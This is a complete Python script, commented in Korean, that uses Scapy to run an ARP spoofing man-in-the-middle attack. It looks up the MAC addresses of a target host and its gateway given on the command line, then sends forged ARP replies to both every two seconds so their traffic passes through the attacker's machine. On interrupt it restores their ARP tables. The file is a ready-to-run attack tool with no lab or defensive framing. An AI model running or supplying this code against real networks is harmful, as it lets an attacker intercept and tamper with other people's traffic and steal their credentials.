from scapy.all import *  # Scapy 라이브러리에서 필요한 모든 기능을 import
import time  # 시간 지연 기능을 위해 import
import sys   # 시스템 인자와 종료를 처리하기 위해 import

def get_mac(ip):
    """주어진 IP 주소에 대한 MAC 주소를 반환하는 함수"""
    print(f"[*] {ip}에 대한 ARP 요청을 전송 중...")
    
    # ARP 요청을 전송하여 MAC 주소를 검색 (L3 계층에서 동작)
    # Ether(dst="ff:ff:ff:ff:ff:ff")는 브로드캐스트로 ARP 요청을 보냄
    # ARP(pdst=ip)는 특정 IP 주소의 MAC 주소를 요청하는 ARP 패킷 생성
    answered, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, retry=10, verbose=False)
    
    # 응답이 있으면 MAC 주소를 반환
    for send, receive in answered:
        return receive[Ether].src
    
    # 응답이 없으면 None 반환
    return None  


def arp_spoof(target_ip, gateway_ip, target_mac, gateway_mac):
    """타겟과 게이트웨이 사이에서 L3 계층에서 ARP 스푸핑을 수행하는 함수"""
    print(f"[*] L3 ARP 스푸핑 시작: 타겟 {target_ip} <-> 게이트웨이 {gateway_ip}")
    
    try:
        while True:
            # 타겟에게 자신의 IP 주소를 게이트웨이로 속이는 패킷 전송 (L3 계층)
            # ARP 패킷에서 pdst는 타겟 IP, psrc는 게이트웨이 IP
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), verbose=False)
            print(f"[+] 타겟 {target_ip}에게 위조된 ARP 패킷 전송")
            
            # 게이트웨이에게 자신의 IP 주소를 타겟으로 속이는 패킷 전송 (L3 계층)
            # ARP 패킷에서 pdst는 게이트웨이 IP, psrc는 타겟 IP
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=False)
            print(f"[+] 게이트웨이 {gateway_ip}에게 위조된 ARP 패킷 전송")
            
            time.sleep(2)  # 2초마다 ARP 스푸핑 반복
    except KeyboardInterrupt:
        # Ctrl+C를 눌러 스푸핑을 중단하면, ARP 테이블 복구 함수를 호출
        print("\n[*] 스푸핑 종료, ARP 테이블 복구 중...")
        restore(target_ip, gateway_ip, target_mac, gateway_mac)


def restore(target_ip, gateway_ip, target_mac, gateway_mac):
    """네트워크를 원래 상태로 복구하는 함수 (L3 계층)"""
    # 타겟과 게이트웨이에게 정상적인 ARP 패킷을 전송하여 ARP 테이블 복구
    # send()는 L3 계층에서 동작, pdst는 대상 IP, psrc는 출처 IP, hwsrc는 올바른 MAC 주소
    send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac), count=3, verbose=False)
    send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac), count=3, verbose=False)
    print("[*] ARP 테이블 복구 완료.")


if __name__ == "__main__":
    # 명령행 인자가 부족할 경우 사용법 출력
    if len(sys.argv) != 3:
        print(f"사용법: {sys.argv[0]} <타겟 IP> <게이트웨이 IP>")
        sys.exit(1)
    
    # 타겟과 게이트웨이의 IP 주소를 명령행 인자로 받음
    target_ip = sys.argv[1]
    gateway_ip = sys.argv[2]

    # 타겟과 게이트웨이의 MAC 주소를 얻기 위한 함수 호출
    target_mac = get_mac(target_ip)
    if target_mac is None:
        print(f"[!] 타겟 {target_ip}의 MAC 주소를 찾을 수 없습니다.")
        sys.exit(1)
    print(f"[+] 타겟 {target_ip}의 MAC 주소: {target_mac}")

    gateway_mac = get_mac(gateway_ip)
    if gateway_mac is None:
        print(f"[!] 게이트웨이 {gateway_ip}의 MAC 주소를 찾을 수 없습니다.")
        sys.exit(1)
    print(f"[+] 게이트웨이 {gateway_ip}의 MAC 주소: {gateway_mac}")

    # MAC 주소를 알아낸 후 ARP 스푸핑 공격 시작
    arp_spoof(target_ip, gateway_ip, target_mac, gateway_mac)
